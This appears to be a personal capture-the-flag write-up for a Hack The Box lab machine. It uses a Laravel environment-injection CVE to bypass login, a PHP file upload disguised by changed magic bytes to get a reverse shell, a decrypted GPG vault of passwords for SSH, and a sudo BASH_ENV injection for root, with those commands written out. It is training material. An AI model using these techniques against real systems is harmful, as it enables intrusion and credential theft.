@@ -1,0 +1,72 @@
+verbose error when visiting /mailing:
+PHP 8.2.28 — Laravel 11.30.0PHP 8.2.28 — Laravel 11.30.0
+
+also it means probably that laravel runs on debug=TRUE
+
+another stack trace when modifying "remember me" parameter in the Requests
+
+it also showed that sqlite is used
+
+searching for the version and CVE affecting it, there are some, including one talking about being able to modify environment variables, which would be great by looking at the stack trace error here:
+
+    if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs
+
+        $request->session()->regenerate();
+
+        $request->session()->put('user_id', 1);
+
+        return redirect('/management/dashboard');
+
+    }
+
+
+we could access directly to /management/dashboard
+https://github.com/Nyamort/CVE-2024-52301
+
+it works by send the parameter ?--env=preprod  this will change the variable to preprod allowing us to directly access the management page when trying to log in. 
+
+And it works, using intercept burp
+
+the profile page shows the user:
+
+hish@environment.htb
+
+
+there you can upload a new photo profile and searching online and doing some test i found out you can actually upload php file just by changing magic bytes. Though they cant be executed without the right extension. Just using .php. as extension works and you obtain a rev shell.
+
+
+in the app folder there is a sqlite DB with some encrypted password for hish:
+
+1|Hish|hish@environment.htb||$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi||2025-01-07 01:51:54|2025-01-12 01:01:48|hish.png
+2|Jono|jono@environment.htb||$2y$12$i.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm||2025-01-07 01:52:35|2025-01-07 01:52:35|jono.png
+3|Bethany|bethany@environment.htb||$2y$12$6kbg21YDMaGrt.iCUkP/s.yLEGAE2S78gWt.6MAODUD3JXFMS13J.||2025-01-07 01:53:18|2025-01-07 01:53:18|bethany.png
+
+
+very hard to crack, meanwhile i found the keyvault inside /home/hish and by using that keyring gpg:
+(simply doing export GNUPGHOME=/tmp/.gnupg and then gpg --output decrypted.txt --decrypt keyvault.gpg)
+
+it gives:
+
+PAYPAL.COM -> Ihaves0meMon$yhere123
+ENVIRONMENT.HTB -> marineSPm@ster!!
+FACEBOOK.COM -> summerSunnyB3ACH!!
+
+which works for ssh
+
+
+
+for root: 
+there is a script runnable with sudo. It contains others binaries called without absolute path so we could try path injection
+
+but path is secured and not modifiable but there is another thing when running sudo -l:
+
+env_keep+="ENV BASH_ENV", use_pty
+searching for this and with the help of chatGPT we know its used as a source script immediately loaded when running so we can try to manipulate that:
+
+echo 'id' > /tmp/.inject.sh
+chmod +x /tmp/.inject.sh
+export BASH_ENV=/tmp/.inject.sh
+sudo /usr/bin/systeminfo
+
+
+and it works so just let it spawn a root shell
